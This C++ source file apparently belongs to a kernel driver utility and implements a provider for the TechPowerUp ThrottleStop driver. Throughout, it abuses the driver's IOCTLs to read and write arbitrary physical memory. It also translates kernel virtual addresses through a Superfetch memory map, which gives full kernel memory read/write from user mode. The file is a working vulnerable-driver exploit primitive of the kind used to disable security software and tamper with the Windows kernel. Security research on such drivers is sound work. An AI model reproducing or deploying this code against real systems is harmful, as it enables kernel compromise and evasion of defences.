/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2025
*
*  TITLE:       TPUP.CPP
*
*  VERSION:     1.45
*
*  DATE:        02 Dec 2025
*
*  TechPowerUp ThrottleStop driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/tpup.h"

static SUPERFETCH_MEMORY_MAP g_TpupMemoryMap = { 0 };
static BOOL g_TpupMemoryMapInitialized = FALSE;
static DWORD g_dwNtBuildNumber = 0;

/*
* TpupEnsureMemoryMap
*
* Purpose:
*
* Initialize memory map (once). Only for stable memory layout, otherwise rebuild the map.
*
*/
BOOL TpupEnsureMemoryMap(VOID)
{
    if (g_TpupMemoryMapInitialized)
        return TRUE;

    if (!supBuildSuperfetchMemoryMap(&g_TpupMemoryMap))
        return FALSE;

    g_TpupMemoryMapInitialized = TRUE;

    supPrintfEvent(kduEventInformation,
        "[+] Memory map built: %llu entries from %lu ranges\r\n",
        g_TpupMemoryMap.TableSize,
        g_TpupMemoryMap.RangeCount);

    return TRUE;
}

/*
* TpupReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory via ThrottleStop driver.
*
*/
BOOL TpupReadWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOL DoWrite)
{
    BOOL bResult;
    DWORD bytesIO = 0;
    ULONG_PTR offset = 0;
    ULONG chunkSize;
    UCHAR inputBuffer[16];
    UCHAR outputBuffer[8];

    if (NumberOfBytes == 0 || Buffer == NULL)
        return FALSE;

    bResult = TRUE;

    while (offset < NumberOfBytes) {

        chunkSize = NumberOfBytes - (ULONG)offset;
        if (chunkSize > TPUP_MAX_CHUNK_SIZE)
            chunkSize = TPUP_MAX_CHUNK_SIZE;

        RtlSecureZeroMemory(inputBuffer, sizeof(inputBuffer));
        RtlSecureZeroMemory(outputBuffer, sizeof(outputBuffer));

        if (DoWrite) {

            *(PULONG64)inputBuffer = PhysicalAddress + offset;
            RtlCopyMemory(&inputBuffer[8], RtlOffsetToPointer(Buffer, offset), chunkSize);

            bResult = DeviceIoControl(DeviceHandle,
                IOCTL_TPUP_WRITE_PHYSICAL_MEMORY,
                inputBuffer,
                8 + chunkSize,
                NULL,
                0,
                &bytesIO,
                NULL);
        }
        else {

            *(PULONG64)inputBuffer = PhysicalAddress + offset;

            bResult = DeviceIoControl(DeviceHandle,
                IOCTL_TPUP_READ_PHYSICAL_MEMORY,
                inputBuffer,
                sizeof(ULONG64),
                outputBuffer,
                chunkSize,
                &bytesIO,
                NULL);

            if (bResult && bytesIO == chunkSize) {
                RtlCopyMemory(RtlOffsetToPointer(Buffer, offset), outputBuffer, chunkSize);
            }
        }

        if (!bResult)
            break;

        offset += chunkSize;
    }

    return bResult;
}

/*
* TpupReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory via ThrottleStop driver.
*
*/
BOOL WINAPI TpupReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return TpupReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* TpupWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory via ThrottleStop driver.
*
*/
BOOL WINAPI TpupWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return TpupReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* TpupReadKernelVirtualMemory
*
* Purpose:
*
* Read kernel virtual memory via ThrottleStop using Superfetch translation.
*
*/
BOOL WINAPI TpupReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    ULONG_PTR currentVA;
    ULONG_PTR currentPA;
    ULONG bytesToRead;
    ULONG bytesRemaining;
    ULONG offset;
    PBYTE destBuffer;

    if (!TpupEnsureMemoryMap())
        return FALSE;

    destBuffer = (PBYTE)Buffer;
    currentVA = Address;
    bytesRemaining = NumberOfBytes;
    offset = 0;

    while (bytesRemaining > 0) {

        if (!supSuperfetchVirtualToPhysical(&g_TpupMemoryMap, currentVA, &currentPA))
            return FALSE;

        bytesToRead = PAGE_SIZE - (ULONG)(currentVA & (PAGE_SIZE - 1));
        if (bytesToRead > bytesRemaining)
            bytesToRead = bytesRemaining;

        if (!TpupReadPhysicalMemory(DeviceHandle, currentPA, destBuffer + offset, bytesToRead))
            return FALSE;

        currentVA += bytesToRead;
        offset += bytesToRead;
        bytesRemaining -= bytesToRead;
    }

    return TRUE;
}

/*
* TpupWriteKernelVirtualMemory
*
* Purpose:
*
* Write kernel virtual memory via ThrottleStop using Superfetch translation.
*
*/
BOOL WINAPI TpupWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    ULONG_PTR currentVA;
    ULONG_PTR currentPA;
    ULONG bytesToWrite;
    ULONG bytesRemaining;
    ULONG offset;
    PBYTE srcBuffer;

    if (!TpupEnsureMemoryMap())
        return FALSE;

    srcBuffer = (PBYTE)Buffer;
    currentVA = Address;
    bytesRemaining = NumberOfBytes;
    offset = 0;

    while (bytesRemaining > 0) {

        if (!supSuperfetchVirtualToPhysical(&g_TpupMemoryMap, currentVA, &currentPA))
            return FALSE;

        bytesToWrite = PAGE_SIZE - (ULONG)(currentVA & (PAGE_SIZE - 1));
        if (bytesToWrite > bytesRemaining)
            bytesToWrite = bytesRemaining;

        if (!TpupWritePhysicalMemory(DeviceHandle, currentPA, srcBuffer + offset, bytesToWrite))
            return FALSE;

        currentVA += bytesToWrite;
        offset += bytesToWrite;
        bytesRemaining -= bytesToWrite;
    }

    return TRUE;
}

/*
* TpupValidatePrerequisites
*
* Purpose:
*
* Check if Superfetch is available and build memory map.
*
*/
BOOL WINAPI TpupValidatePrerequisites(
    _In_ PKDU_CONTEXT Context)
{
    BOOLEAN oldValue = FALSE;
    NTSTATUS ntStatus;

    g_dwNtBuildNumber = Context->NtBuildNumber;

    //
    // Only enable privilege, defer map building
    //
    ntStatus = RtlAdjustPrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE, TRUE, FALSE, &oldValue);
    if (!NT_SUCCESS(ntStatus)) {
        supPrintfEvent(kduEventError,
            "[-] Failed to enable SE_PROF_SINGLE_PROCESS_PRIVILEGE (0x%lX)\r\n", ntStatus);
        return FALSE;
    }

    supPrintfEvent(kduEventInformation,
        "[+] Superfetch prerequisites validated\r\n");

    return TRUE;
}

/*
* TpupFreeResources
*
* Purpose:
*
* Free provider resources (memory map).
*
*/
VOID TpupFreeResources(VOID)
{
    supFreeSuperfetchMemoryMap(&g_TpupMemoryMap);
}
